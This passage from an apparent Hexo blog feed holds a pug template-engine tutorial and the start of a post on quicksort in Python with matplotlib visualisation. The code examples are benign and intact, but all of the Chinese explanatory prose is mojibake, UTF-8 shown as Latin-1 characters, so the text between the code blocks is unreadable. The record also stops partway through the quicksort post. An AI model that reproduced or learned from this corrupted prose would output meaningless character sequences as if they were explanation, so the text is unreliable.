<p><code>pug</code>åŸå<code>jade</code>,å› ç‰ˆæƒé—®é¢˜æ›´åä¸º<code>pug</code>,å³å“ˆå·´ç‹—ã€‚ä¸<code>hexo</code>é»˜è®¤æ¨¡å—<code>ejs</code>ä¸€æ ·ï¼Œ<code>pug</code>ä¹Ÿæ˜¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œå¯ç”¨äºå¿«é€Ÿçš„ç½‘ç«™å¼€å‘ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºé™æ€åšå®¢ç½‘ç«™çš„è®¾è®¡ã€‚æœ¬ç«™ç‚¹ç°æ—¶æ‰€ç”¨ä¸»é¢˜<code>manupassant</code>ä¹Ÿä½¿ç”¨äº†<code>pug</code>ã€‚</p>
<a id="more"></a>
<p>æœ¬æ–‡é’ˆå¯¹<code>Hexo</code>ä¸­ä½¿ç”¨<code>pug</code>çš„æƒ…å†µä¸ºä¾‹ï¼Œè¯´æ˜å…¶åŸºæœ¬è¯­æ³•ã€‚</p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><pre><code class="sh"># common install
npm install pug

# install for hexo blog
npm install hexo-renderer-pug --save
</code></pre>
<h2 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><p><code>pug</code>ä¸åŒäº<code>html</code>ï¼Œå‰è€…ä¸éœ€è¦æ ‡ç­¾çš„å¼€å’Œé—­ï¼Œå¦‚<code>html</code>çš„<code>&lt;p&gt;Demo&lt;/p&gt;</code>ï¼Œåœ¨<code>pug</code>ä½¿ç”¨<code>p Demo</code>å³å¯ã€‚</p>
<h3 id="ç¼©è¿›"><a href="#ç¼©è¿›" class="headerlink" title="ç¼©è¿›"></a>ç¼©è¿›</h3><p><code>pug</code>å¯¹ç©ºæ ¼æ•æ„Ÿï¼Œæœ‰ç‚¹ç±»ä¼¼<code>python</code>å¯¹åˆ¶è¡¨ç¬¦<code>tab</code>æ•æ„Ÿã€‚<code>pug</code>ä½¿ç”¨ç©ºæ ¼ä½œä¸ºç¼©è¿›ç¬¦ï¼Œå½“ç„¶ç”¨soft tabä¹Ÿå¯è¡Œã€‚åŒä¸€çº§æ ‡ç­¾éœ€ä¿è¯å·¦å¯¹é½ã€‚</p>
<pre><code class="pug">div
    p Hello, world!
    p Hello, pug.
</code></pre>
<p>æ¸²æŸ“ç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="html">&lt;div&gt;
    &lt;p&gt;Hellow, world!&lt;/p&gt;
    &lt;p&gt;Hello, pug.&lt;/p&gt;
&lt;/div&gt;
</code></pre>
<h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p><code>pug</code>ä½¿ç”¨<code>//-</code>æˆ–<code>//</code>å¯¹ä»£ç è¿›è¡Œæ³¨é‡Šï¼Œå‰è€…æ³¨é‡Šå†…å®¹ä¸å‡ºç°åœ¨æ¸²æŸ“åçš„<code>html</code>æ–‡ä»¶ä¸­ï¼Œåè€…åä¹‹ã€‚</p>
<pre><code class="pug">//- htmlä¸­ä¸åŒ…å«æ­¤è¡Œ
// htmlä¸­ä¼šåŒ…å«æ­¤è¡Œ
</code></pre>
<h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p><code>pug</code>å°†æ ‡ç­¾å±æ€§å­˜æ”¾äºæ‹¬å·<code>()</code>å†…ï¼Œå¤šä¸ªå±æ€§ä¹‹é—´ä»¥é€—å·æˆ–ç©ºæ ¼åˆ†éš”ã€‚æ­¤å¤–ï¼Œå¯¹äºæ ‡ç­¾çš„<code>id</code>å’Œ<code>class</code>ï¼Œ<code>pug</code>ä½¿ç”¨<code>#</code>ç´§è·Ÿæ ‡ç­¾<code>id</code>,ä½¿ç”¨<code>.</code>ç´§è·Ÿæ ‡ç­¾<code>class</code>ï¼Œå¯ä»¥åŒæ—¶è®¾ç½®å¤šä¸ª<code>class</code>ã€‚</p>
<pre><code class="pug">h1#title Test title
img#name.class1.class2(src=&quot;/test.png&quot; alt=&quot;test&quot;)
</code></pre>
<p>â†“</p>
<pre><code class="html">&lt;h1 id=&quot;title&quot;&gt;Test title&lt;/h1&gt;
&lt;img id=&quot;name&quot; class=&quot;class1 class2&quot; src=&quot;/test.png&quot; alt=&quot;test&quot;&gt;
</code></pre>
<h3 id="åŒ…å«"><a href="#åŒ…å«" class="headerlink" title="åŒ…å«"></a>åŒ…å«</h3><p>ä¸ºäº†æ–¹ä¾¿ä»£ç å¤ç”¨ï¼Œ<code>pug</code>æä¾›äº†<code>include</code>åŒ…å«åŠŸèƒ½ï¼Œä»¥ä¸‹ä»£ç ä¼šå°†<code>_partial</code>ç›®å½•ä¸‹çš„<code>head.pug</code>æ–‡ä»¶å†…å®¹åŒ…å«åˆ°å½“å‰è°ƒç”¨çš„ä½ç½®ã€‚æœ‰ç‚¹<code>C/C++</code>ä¸­å†…è”å‡½æ•°çš„æ„æ€ã€‚</p>
<pre><code class="pug">doctype html
html(lang=&#39;en&#39;)
    include _partial/head.pug
</code></pre>
<h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„<code>base</code>æ¨¡æ¿ï¼Œé€šè¿‡<code>block</code>å®šä¹‰äº†é¡µé¢å¤´éƒ¨<code>head</code>å’Œå†…å®¹<code>body</code>ã€‚å—<code>block</code>æœ‰ç‚¹ç±»ä¼¼<code>C/C++</code>çš„æŠ½è±¡å‡½æ•°ï¼Œéœ€è¦åœ¨ç»§æ‰¿è€…ä¸­å®Œæˆå®šä¹‰ï¼Œå¡«å……å…·ä½“å†…å®¹ã€‚</p>
<pre><code class="pug">//- base.pug
html
    head
        block title
    body
        block content
</code></pre>
<p>ä»¥ä¸‹æ–‡ä»¶ä½¿ç”¨<code>extends</code>ç»§æ‰¿ä»¥ä¸Šæ¨¡æ¿ï¼Œé€šè¿‡<code>block</code>è¦†ç›–æˆ–æ›¿æ¢åŸæœ‰å—<code>block</code>ã€‚å½“ç„¶ï¼Œç»§æ‰¿è€…ä¹Ÿå¯ä»¥åœ¨åŸæœ‰åŸºç¡€ä¸Šç»§ç»­æ‰©å±•ã€‚</p>
<pre><code class="pug">//- index.pug
extends base.pug

block title
    title &quot;Test title&quot;

block content
    h1 Hello world!
    block article
</code></pre>
<h3 id="å®šä¹‰å˜é‡"><a href="#å®šä¹‰å˜é‡" class="headerlink" title="å®šä¹‰å˜é‡"></a>å®šä¹‰å˜é‡</h3><p><code>pug</code>ä¸­é€šè¿‡<code>- var name = value</code>çš„å½¢å¼å®šä¹‰å˜é‡</p>
<pre><code class="pug">- var intData = 100
- var boolData = false
- var stringData = &#39;Test&#39;
p.int= intData
p.bool= boolData
p.stringData= stringData
</code></pre>
<blockquote>
<p>éœ€æ³¨æ„çš„æ˜¯ï¼Œåœ¨å¼•ç”¨å˜é‡æ—¶ï¼Œéœ€è¦åœ¨å¼•ç”¨ä½ç½®åŠ ä¸Š<code>=</code>å·ï¼Œå¦åˆ™ä¼šé»˜è®¤å°†å˜é‡åå½“æˆæ™®é€šå­—ç¬¦ä¸²ä½¿ç”¨ã€‚</p>
</blockquote>
<p>å¦‚æœæƒ³è¦å°†å˜é‡ä¸å…¶å®ƒå­—ç¬¦ä¸²å¸¸é‡æˆ–æ˜¯å˜é‡è¿æ¥åœ¨ä¸€èµ·ï¼Œå°±ä¸èƒ½ç”¨ç­‰å·äº†ï¼Œè€Œæ˜¯åº”è¯¥ç”¨<code>#{}</code>ï¼Œè¯¥ç¬¦å·ä¼šå¯¹å¤§æ‹¬å·å†…çš„å˜é‡è¿›è¡Œæ±‚å€¼å’Œè½¬ä¹‰ï¼Œæœ€ç»ˆå¾—åˆ°æ¸²æŸ“è¾“å‡ºçš„å†…å®¹ã€‚</p>
<pre><code class="pug">- var girl = &#39;Lily&#39;
- var boy = &#39;Jack&#39;
p #{girl} is so beautiful!
p And #{boy} is handsome.
</code></pre>
<h3 id="æ¡ä»¶ç»“æ„"><a href="#æ¡ä»¶ç»“æ„" class="headerlink" title="æ¡ä»¶ç»“æ„"></a>æ¡ä»¶ç»“æ„</h3><p><code>pug</code>çš„æ¡ä»¶è¯­å¥ä¸å…¶å®ƒè¯­è¨€ç±»ä¼¼ï¼Œå‡æ˜¯å¦‚ä¸‹è¿™èˆ¬ï¼š</p>
<pre><code class="pug">- var A = {value: &#39;Test&#39;}
- var B = true
if A.value
    p= A.value
else if B
    p= B
else
    p nothing
</code></pre>
<h3 id="è¿­ä»£"><a href="#è¿­ä»£" class="headerlink" title="è¿­ä»£"></a>è¿­ä»£</h3><p><code>pug</code>ä¸­ä½¿ç”¨<code>each</code>å’Œ<code>while</code>å®ç°å¾ªç¯è¿­ä»£ï¼Œ<code>each</code>å¯ä»¥è¿”å›å½“å‰æ‰€åœ¨é¡¹çš„ç´¢å¼•å€¼ï¼Œé»˜è®¤ä»0å¼€å§‹è®¡æ•°ã€‚</p>
<pre><code class="pug">//- each
ol
    each item in [&#39;Sun&#39;, &#39;Mon&#39;, &#39;Tus&#39;, &#39;Wen&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;]
        li= item

//- get index of each
- var week = [&#39;Sun&#39;, &#39;Mon&#39;, &#39;Tus&#39;, &#39;Wen&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;]
ol
    each item, index in week
        li= index + &#39;:&#39; + item
</code></pre>
<p>â†“</p>
<pre><code class="html">&lt;ol&gt;
  &lt;li&gt;Sun&lt;/li&gt;
  &lt;li&gt;Mon&lt;/li&gt;
  &lt;li&gt;Tus&lt;/li&gt;
  &lt;li&gt;Wen&lt;/li&gt;
  &lt;li&gt;Thu&lt;/li&gt;
  &lt;li&gt;Fri&lt;/li&gt;
  &lt;li&gt;Sat&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
  &lt;li&gt;0:Sun&lt;/li&gt;
  &lt;li&gt;1:Mon&lt;/li&gt;
  &lt;li&gt;2:Tus&lt;/li&gt;
  &lt;li&gt;3:Wen&lt;/li&gt;
  &lt;li&gt;4:Thu&lt;/li&gt;
  &lt;li&gt;5:Fri&lt;/li&gt;
  &lt;li&gt;6:Sat&lt;/li&gt;
&lt;/ol&gt;
</code></pre>
<p><code>while</code>è°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="pug">//- while
- var day = 1
ul
    while day &lt; 7
        li= day++
</code></pre>
<h3 id="Minix"><a href="#Minix" class="headerlink" title="Minix"></a>Minix</h3><p><code>mixin</code>åæ›°<strong>æ··å…¥</strong>ï¼Œç±»ä¼¼å…¶å®ƒç¼–ç¨‹è¯­è¨€ä¸­çš„<strong>å‡½æ•°</strong>ï¼Œä¹Ÿæ˜¯ä¸ºäº†ä»£ç å¤ç”¨ï¼Œå¯å¸¦å‚æ•°æˆ–ä¸å¸¦å‚æ•°ï¼Œå®šä¹‰æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="pug">mixin menu-item(href, name)
    li
        span.dot â—
        a(href=href)= name
</code></pre>
<p>å…¶ä¸­ï¼Œ<code>menu-item</code>ä¸ºè°ƒç”¨æ—¶æ‰€ç”¨åç§°ï¼Œå¯è®¤ä¸ºæ˜¯å‡½æ•°åï¼Œ<code>href</code>åŠ<code>name</code>æ˜¯å‚æ•°ã€‚åŒä¸Š<a href="#å®šä¹‰å˜é‡">å®šä¹‰å˜é‡</a>æ‰€è¯´ï¼Œ<code>a(href=href)= name</code>ä¸­ç¬¬äºŒä¸ª<code>=</code>æ˜¯ä¸ºäº†å°†åé¢çš„<code>name</code>å½“ä½œå‚æ•°æ¥å¤„ç†ï¼Œè€Œä¸æ˜¯å½“ä½œå­—ç¬¦ä¸²&quot;name&quot;æ¥å¤„ç†ã€‚</p>
<p>è°ƒç”¨<code>mixin</code>å®šä¹‰çš„ä»£ç å—ï¼Œéœ€é€šè¿‡<code>+</code>å·ç´§è·Ÿ<code>mixin</code>åç§°åŠå‚æ•°:</p>
<pre><code class="pug">+menu-item(&#39;/Archives&#39;,&#39;Archives&#39;)
+menu-item(&#39;/About&#39;,&#39;About&#39;)
</code></pre>
<p><code>mixin</code>ä¹‹æ‰€ä»¥ç§°ä¸ºæ··å…¥ï¼Œæ˜¯å› ä¸ºå…¶è¯­æ³•ä¸å±€é™äºå‡½æ•°è°ƒç”¨ï¼Œåœ¨<code>mixin</code>å¯ä»¥ä½¿ç”¨å—<code>block</code></p>
<pre><code class="pug">mixin print(post)
    if block
        block
    else
        p= post

+print(&quot;no block&quot;)
+print(&quot;&quot;)
    div.box
        p this is the content of block
</code></pre>
<p>â†“</p>
<pre><code class="html">&lt;p&gt;no block&lt;/p&gt;
&lt;div class=&quot;box&quot;&gt;&lt;p&gt;this is the content of block&lt;/p&gt;&lt;/div&gt;
</code></pre>
<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>æ³¨æ„ä»¥ä¸‹<code>pug</code>è¯­å¥ä¸­ç¬¬ä¸€è¡Œçš„<code>.</code>å·ã€‚</p>
<pre><code class="pug">script(type=&#39;text/javascript&#39;).
    var data = &quot;Test&quot;
    var enable = true
    if enable
        console.log(data)
    else
        console.log(&#39;nothing&#39;)
</code></pre>
<p>â†“</p>
<pre><code class="js">&lt;script type=&#39;text/javascript&#39;&gt;
    var data = &quot;Test&quot;
    var enable = true
    if enable
        console.log(data)
    else
        console.log(&#39;nothing&#39;)
&lt;/script&gt;
</code></pre>
<p>å¯¹äºç®€å•è„šæœ¬ï¼Œä½¿ç”¨<code>pug</code>å°šå¯ï¼Œå¤æ‚çš„è¿˜æ˜¯å•ç‹¬å†™åˆ°<code>.js</code>æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡<code>pug</code>å¼•ç”¨æ–¹ä¾¿ä¸€äº›ï¼Œå¼•ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="pug">script(type=&#39;text/javascript&#39;, src=&#39;/path/to/js&#39;)

//- with hexo function url_for
script(type=&#39;text/javascript&#39;, src=url_for(theme.js) + &#39;/ready.js&#39;)
</code></pre>
<h3 id="hexo-ç›¸å…³"><a href="#hexo-ç›¸å…³" class="headerlink" title="hexo ç›¸å…³"></a>hexo ç›¸å…³</h3><p>åœ¨<code>hexo</code>ä¸»é¢˜ä¸­ä½¿ç”¨<code>pug</code>æ—¶ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨<code>hexo</code>æä¾›çš„å…¨å±€å˜é‡<code>config</code>ï¼Œ<code>theme</code>æ¥åˆ†åˆ«è°ƒç”¨åšå®¢æ ¹ç›®å½•ä¸‹<code>_config.yml</code>æ–‡ä»¶ä¸­çš„å‚æ•°ä»¥åŠä¸»é¢˜æ ¹ç›®å½•ä¸‹<code>_config.yml</code>æ–‡ä»¶ä¸­çš„å‚æ•°ã€‚</p>
<pre><code class="pug">//- blog config
p= config.description

//- theme config
p= theme.title
</code></pre>
<p>å½“ç„¶ï¼Œ<code>pug</code>ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨<code>hexo</code>æä¾›çš„å…¶å®ƒå…¨å±€å˜é‡åŠè¾…åŠ©å‡½æ•°ï¼Œä½¿ç”¨æ–¹æ³•è¯¦è§<code>hexo</code>çš„<a href="https://hexo.io/zh-cn/docs/variables" target="_blank" rel="noopener">æ–‡æ¡£</a></p>
<h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><pre><code class="pug">//- head.pug
head
    meta(http-equiv=&#39;content-type&#39;, content=&#39;text/html; charset=utf-8&#39;)
    meta(content=&#39;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&#39;, name=&#39;viewport&#39;)
    meta(content=&#39;yes&#39;, name=&#39;apple-mobile-web-app-capable&#39;)
    meta(content=&#39;black-translucent&#39;, name=&#39;apple-mobile-web-app-status-bar-style&#39;)
    meta(content=&#39;telephone=no&#39;, name=&#39;format-detection&#39;)
    meta(name=&#39;description&#39;, content=config.description)
    block title
    link(rel=&#39;stylesheet&#39;, type=&#39;text/css&#39;, href=url_for(theme.css) + &#39;/style.css&#39; + &#39;?v=&#39; + theme.version)
    link(rel=&#39;Shortcut Icon&#39;, type=&#39;image/x-icon&#39;, href=url_for(&#39;favicon.png&#39;))
    script(type=&#39;text/javascript&#39;, src=&#39;//cdn.bootcss.com/jquery/3.3.1/jquery.min.js&#39;)
    block more
</code></pre>
<pre><code class="pug">//- base.pug
doctype html
html(lang=&#39;en&#39;)
    include _partial/head.pug
    block more
        link(rel=&#39;stylesheet&#39;, type=&#39;text/css&#39;, href=url_for(theme.plugins) + &#39;/prettify/doxy.css&#39;)
        script(type=&#39;text/javascript&#39;, src=url_for(theme.js) + &#39;/ready.js&#39; + &#39;?v=&#39; + theme.version, async)

    //- body
    body: #container.box
        .h-wrapper
            include _partial/nav-menu.pug
        // article content
        block content

        include _partial/footer.pug
</code></pre>
<p>å…¶ä¸­:</p>
<ul>
<li><code>theme.*</code>ä¸ºä¸»é¢˜é…ç½®æ–‡ä»¶<code>_config.yml</code>ä¸­çš„å‚æ•°</li>
<li><code>url_for</code>ä¸º<code>hexo</code>æä¾›çš„ç”¨äºæŸ¥æ‰¾èµ„æºè·¯å¾„çš„å‡½æ•°</li>
</ul>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><code>pug</code>æä¾›äº†åŒ…å«ï¼Œç»§æ‰¿ï¼ŒMixinç­‰å¤šç§æ–¹å¼ç”¨äºä»£ç å¤ç”¨ï¼Œè¯­æ³•ç®€æ´æ˜“æ‡‚ï¼Œé™¤äº†åˆå­¦æ—¶éœ€èŠ±è´¹ä¸€äº›æ—¶é—´å­¦ä¹ å„ç§æ ‡ç‚¹ç¬¦å·çš„å«ä¹‰å¤–ï¼Œå…¶å®ƒå€’ä¹Ÿæ²¡æœ‰å¤ªå¤§å›°éš¾ã€‚</p>
<p>å½“ç„¶å•¦ï¼Œ<code>pug</code>è¿˜æœ‰è®¸å¤šå…¶å®ƒç‰¹æ€§ï¼Œä½†å°±æˆ‘ç›®å‰ä½¿ç”¨æƒ…å†µè€Œè¨€ï¼Œä»¥ä¸Šè¿™äº›ä¾¿å·²è¶³å¤Ÿã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://pugjs.org/zh-cn/api/getting-started.html" target="_blank" rel="noopener">https://pugjs.org/zh-cn/api/getting-started.html</a></li>
<li><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonå®ç°å¿«æ’åŠå…¶å¯è§†åŒ–]]></title>
      <url>https://www.litreily.top/2018/07/07/quick-sort/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘è£…äº†ä¸ª<code>Anaconda</code>ï¼Œå‡†å¤‡å­¦ä¹ ä¸€ä¸‹æ•°æ®å¯è§†åŒ–ã€‚æœ¬ç€ä¸‰å¤©æ‰“é±¼ä¸¤å¤©è£…æ­»çš„å¿ƒæ€ï¼Œé‡æ–°æŠ±èµ·å´­æ–°çš„<strong>ç®—æ³•</strong>ä¹¦ï¼Œè®¤çœŸå­¦èµ·äº†å¿«æ’ç®—æ³•ã€‚å­¦å®Œåç”¨<code>Python</code>å®ç°äº†ä¸€éåŸºæœ¬çš„å¿«æ’ï¼Œç„¶åä½¿ç”¨<code>matplotlib</code>è¿›è¡ŒåŠ¨æ€ç»˜å›¾ï¼Œæœ€åä½¿ç”¨<code>imageio</code>ç”ŸæˆGIFå›¾ç‰‡ã€‚è°¨ä»¥æ­¤æ–‡ä»¥è®°ä¹‹ï¼</p>
<h2 id="å¿«æ’åŸºæœ¬åŸç†"><a href="#å¿«æ’åŸºæœ¬åŸç†" class="headerlink" title="å¿«æ’åŸºæœ¬åŸç†"></a>å¿«æ’åŸºæœ¬åŸç†</h2><p><strong>å¿«æ’</strong>é‡‡ç”¨å’Œå½’å¹¶æ’åºç›¸åŒçš„åˆ†è€Œæ²»ä¹‹çš„æ€æƒ³ï¼Œå°†å¾…æ’åºæ•°ç»„åˆ†æˆå·¦å³ä¸¤ä¸ªå­æ•°ç»„ï¼Œå¯¹ä¸¤éƒ¨åˆ†å­æ•°ç»„ç‹¬ç«‹æ’åºã€‚å½“å­æ•°ç»„å‡æœ‰åºæ—¶ï¼Œæ•´ä¸ªæ•°ç»„ä¹Ÿå°±æœ‰åºäº†ã€‚</p>
<p>æ’åºæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>å°†åŸå§‹æ•°ç»„<code>data</code>éšæœºæ‰“ä¹±ï¼Œä»¥æ¶ˆé™¤å¯¹è¾“å…¥çš„ä¾èµ–ï¼ˆæœ¬æ­¥å¯é€‰ï¼‰</li>
<li>é€‰æ‹©æ•°ç»„çš„é¦–ä¸ªå…ƒç´ <code>data[0]</code>ä½œä¸ºåˆ‡åˆ†å…ƒç´ <code>v</code></li>
<li>åˆ‡åˆ†æ•°ç»„<ul>
<li>ä»å·¦å¾€å³æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºåˆ‡åˆ†å…ƒç´ <code>v</code>çš„å…ƒç´ <code>data[i]</code></li>
<li>ä»å³åˆ°å·¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªå°äºåˆ‡åˆ†å…ƒç´ <code>v</code>çš„å…ƒç´ <code>data[j]</code></li>
<li>äº¤æ¢<code>data[i]</code>ä¸<code>data[j]</code></li>
<li>é‡å¤ä»¥ä¸Šä¸‰æ­¥ç›´åˆ°<code>i&gt;=j</code></li>
<li>äº¤æ¢<code>data[j]</code>ä¸åˆ‡åˆ†å…ƒç´ <code>data[0]</code></li>
</ul>
</li>
<li>é€’å½’è°ƒç”¨ï¼Œå¯¹åˆ‡åˆ†åçš„å·¦ä¾§å­æ•°ç»„è¿›è¡Œæ’åº</li>
<li>é€’å½’è°ƒç”¨ï¼Œå¯¹åˆ‡åˆ†åçš„å³ä¾§å­æ•°ç»„è¿›è¡Œæ’åº</li>
</ol>
<p>æ–‡å­—æ€§çš„æè¿°æ€»æ˜¯é‚£ä¹ˆè‹ç™½æ— åŠ›ï¼Œä½†è¿˜å¥½ä¹Ÿèƒ½è¯´æ˜ä¸€äº›é—®é¢˜ã€‚å¯ä»¥çœ‹å‡ºï¼Œå¿«æ’çš„å…³é”®åœ¨äº<strong>åˆ‡åˆ†</strong>ï¼Œåˆ‡åˆ†åçš„æ•°ç»„åº”è¯¥æ»¡è¶³ï¼š</p>
<ol>
<li>åˆ‡åˆ†å…ƒç´ çš„ä½ç½®ï¼ˆè®¾ä¸º<code>j</code>ï¼‰å·²ç»å›ºå®š</li>
<li><code>data[lo]</code>åˆ°<code>data[j-1]</code>åŒºé—´å†…çš„å…ƒç´ å‡ä¸å¤§äºåˆ‡åˆ†å…ƒç´ <code>data[j]</code></li>
<li><code>data[j+1]</code>åˆ°<code>data[hi]</code>åŒºé—´å†…çš„å…ƒç´ å‡ä¸å°äºåˆ‡åˆ†å…ƒç´ <code>data[j]</code></li>
</ol>
<p>å…¶ä¸­<code>data[lo]</code>ä»£è¡¨æ•°ç»„æˆ–å­æ•°ç»„çš„é¦–ä¸ªå…ƒç´ ï¼Œ<code>data[hi]</code>ä»£è¡¨æ•°ç»„æˆ–å­æ•°ç»„çš„æœ«å°¾å…ƒç´ ã€‚</p>
<p>ç®€å•ç‚¹è¯´ï¼Œå°±æ˜¯å…ˆæ‰¾ä¸€ä¸ªå‚è€ƒç‚¹ï¼ŒæŠŠå°äºè¿™ä¸ªå‚è€ƒç‚¹çš„å…ƒç´ éƒ½æ‰”åˆ°å®ƒçš„å·¦è¾¹ï¼Œå¤§äºè¿™ä¸ªå‚è€ƒç‚¹çš„æ•°éƒ½æ‰”åˆ°å®ƒçš„å³è¾¹ã€‚è¿™æ ·ä¸€æ¥ï¼Œå‚è€ƒç‚¹çš„ä½ç½®å°±å›ºå®šäº†ï¼Œç„¶åå¯¹å·¦è¾¹çš„æ•°æ®å’Œå³è¾¹çš„æ•°æ®å„è‡ªå†é€’å½’çš„æ‰”å‡ éï¼Œç­‰æ‰€æœ‰å­æ•°ç»„éƒ½æ‰”å®Œäº†ï¼Œæ•´ä¸ªæ•°ç»„ä¹Ÿå°±æœ‰åºäº†ã€‚</p>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰”çš„æ—¶å€™ä¸æ˜¯éšä¾¿æ‰”ï¼Œæ˜¯æŠŠä»å·¦å¾€å³æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå¤§äºå‚è€ƒç‚¹çš„å€¼å’Œä»å³å¾€å·¦æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå°äºå‚è€ƒç‚¹çš„å€¼è¿›è¡Œæ›¿æ¢ã€‚</p>
<h2 id="åŸºæœ¬å®ç°"><a href="#åŸºæœ¬å®ç°" class="headerlink" title="åŸºæœ¬å®ç°"></a>åŸºæœ¬å®ç°</h2><blockquote>
<p>Talk is cheap, show me the code</p>
</blockquote>
<pre><code class="python">def sort(data):
    __sort(data, 0, len(data) - 1)

def __sort(data, lo, hi):
    if lo &gt;= hi:
        return
    key = __partition(data, lo, hi)
    __sort(data, lo, key - 1)
    __sort(data, key + 1, hi)

def __swap(data, lo, hi):
    data[lo], data[hi] = data[hi], data[lo]

def __partition(data, lo, hi):
    &#39;&#39;&#39;partition array&#39;&#39;&#39;
    i = lo
    j = hi
    v = data[lo] # slicing element
    while True:
        # find one element that larger than v scan from left to right(â†’)
        i += 1
        while data[i] &lt; v:
            if i == hi:
                break
            i += 1

        # find one element that smaller than v scan from right to left(â†)
        while v &lt; data[j]:
            if j == lo:
                break
            j -= 1

        if i &gt;= j:
            break
        __swap(data, i, j)
    __swap(data, lo, j)
    return j
</code></pre>
<p>ä»¥ä¸Šä¾¿æ˜¯å‚è€ƒ<code>Algorithms</code>ä¹¦ä¸Š<code>java</code>ä»£ç çš„<code>Python</code>å®ç°ã€‚ä¸‹é¢æ˜¯ä¸ªä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="python">import random

def main():
    data = [_ for _ in range(20)]
    random.shuffle(data)
    print(data)
    sort(data)
    print(data)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="bash">$ python quick.py
[4, 9, 1, 13, 18, 5, 6, 14, 2, 16, 7, 12, 15, 8, 11, 17, 0, 19, 10, 3]
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]
</code></pre>
<h2 id="å¿«æ’ä¼˜åŒ–"><a href="#å¿«æ’ä¼˜åŒ–" class="headerlink" title="å¿«æ’ä¼˜åŒ–"></a>å¿«æ’ä¼˜åŒ–</h2><p>å¿«æ’æœ‰å¾ˆå¤šä¼˜åŒ–ç®—æ³•ï¼Œç›®å‰æˆ‘åªä¹ å¾—ä¸€ç§æœ€ç®€å•çš„ï¼Œå¯ä»¥å°†åˆ‡åˆ†å‡½æ•°ä¸¤ä¸ªå†…éƒ¨<code>while</code>å¾ªç¯ä¸­çš„<code>if</code>è¯­å¥å»æ‰</p>
<pre><code class="python"># first one
if i == hi:
    break

# second one
if j == lo:
    break
</code></pre>
<p>è¿™ä¸¤ä¸ªåˆ¤æ–­éƒ½æ˜¯ä¸ºäº†é˜²æ­¢è®¿é—®æ•°ç»„è¶Šç•Œè€Œè®¾ï¼Œå…¶å®ç¬¬äºŒä¸ªæ˜¯å®Œå…¨æ²¡æœ‰å¿…è¦åŠ çš„ï¼Œå› ä¸º<code>lo</code>å¯¹åº”çš„å°±æ˜¯åˆ‡åˆ†å…ƒç´ æœ¬èº«ï¼Œè‡ªå·±è‚¯å®šä¸ä¼šå°äºè‡ªå·±ï¼Œæ‰€ä»¥è¿™ä¸ªåˆ¤æ–­å®Œå…¨æ˜¯å¤šä½™çš„ï¼›å¯¹äºç¬¬ä¸€ä¸ªï¼Œæƒ³è¦å»æ‰çš„è¯ï¼Œåªè¦ä¿è¯æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ æœ€å¤§å³å¯ï¼Œå®ç°ä¸Šåªè¦åœ¨æ‰§è¡Œæ’åºå‡½æ•°ä¹‹å‰å°†æœ€å¤§å€¼æ¢è‡³æœ€åå³å¯ã€‚</p>
<pre><code class="py">__swap(data, data.index(max(data)), len(data) - 1)
</code></pre>
<p>æœ¬æ–‡åç»­çš„<code>code</code>ä¼šå°†ç¬¬äºŒä¸ªåˆ¤æ–­å»æ‰ï¼Œä½†ç¬¬ä¸€ä¸ªçš„è¿˜ä¿ç•™ç€ï¼Œæ¯•ç«ŸæŠŠæœ€å¤§å€¼ç›´æ¥æŒªåˆ°æœ€åæ€»æ„Ÿè§‰æ€ªæ€ªçš„ï¼Œåœ¨å¯è§†åŒ–çš„æ—¶å€™ä¹Ÿä¼šç‰ºç‰²ä¸€ç‚¹éšæœºæ€§ã€‚</p>
